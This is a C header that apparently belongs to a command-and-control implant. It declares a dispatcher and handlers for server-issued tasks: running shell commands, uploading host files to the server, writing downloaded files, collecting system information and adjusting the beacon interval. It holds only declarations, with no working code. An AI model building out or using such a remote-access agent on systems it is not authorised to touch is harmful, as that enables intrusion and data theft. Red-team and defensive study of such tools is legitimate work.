/* ==========================================================================
 * capabilities.h - Capability Dispatch Interface
 * ==========================================================================
 * Each capability is a self-contained handler that:
 *   1. Receives decoded TLV fields from a TASK message
 *   2. Performs the requested operation via PAL
 *   3. Builds a RESULT TLV message with the output
 *
 * The dispatcher maps TLV_TASK_TYPE values to the appropriate handler.
 * ========================================================================== */
#ifndef CAPABILITIES_H
#define CAPABILITIES_H

#include "tlv.h"
#include "agent.h"

/* ---- Dispatcher ------------------------------------------------------- */

/**
 * Dispatch a task to the appropriate capability handler.
 *
 * `fields`/`field_count` are the decoded TLV fields from the TASK message.
 * `result` is an initialised TLV buffer that the handler fills with
 * RESULT fields (TLV_TASK_ID, TLV_RESULT_STATUS, TLV_RESULT_DATA, etc.).
 *
 * Returns 0 on success (handler executed), -1 if the task type is unknown
 * or the handler failed.
 */
int capability_dispatch(agent_ctx_t *ctx,
                        const tlv_field_t *fields, size_t field_count,
                        tlv_buffer_t *result);

/* ---- Individual capability handlers ----------------------------------- */

/**
 * Execute a shell command.
 * Expects TLV_TASK_DATA to contain the command string.
 * Produces TLV_RESULT_STATUS (exit code) and TLV_RESULT_DATA (output).
 */
int cap_exec(const tlv_field_t *fields, size_t field_count,
             tlv_buffer_t *result);

/**
 * Upload a file from the agent to the server.
 * Expects TLV_FILE_PATH to contain the path to read.
 * Produces TLV_RESULT_STATUS and TLV_FILE_DATA with the file contents.
 */
int cap_upload(const tlv_field_t *fields, size_t field_count,
               tlv_buffer_t *result);

/**
 * Download a file from the server to the agent.
 * Expects TLV_FILE_PATH (destination) and TLV_FILE_DATA (contents).
 * Produces TLV_RESULT_STATUS indicating success or failure.
 */
int cap_download(const tlv_field_t *fields, size_t field_count,
                 tlv_buffer_t *result);

/**
 * Gather system information.
 * Produces TLV_HOSTNAME, TLV_OS_INFO, TLV_ARCH, and TLV_RESULT_STATUS.
 */
int cap_sysinfo(const tlv_field_t *fields, size_t field_count,
                tlv_buffer_t *result);

/**
 * Adjust the beacon sleep interval.
 * Expects TLV_TASK_DATA containing the new interval as a uint32 (seconds).
 * Produces TLV_RESULT_STATUS and TLV_BEACON_INTERVAL with the new value.
 *
 * NOTE: This handler needs access to agent_ctx_t to modify the interval,
 * so it has a different signature than other handlers.  The dispatcher
 * calls it specially.
 */
int cap_sleep(agent_ctx_t *ctx,
              const tlv_field_t *fields, size_t field_count,
              tlv_buffer_t *result);

#endif /* CAPABILITIES_H */
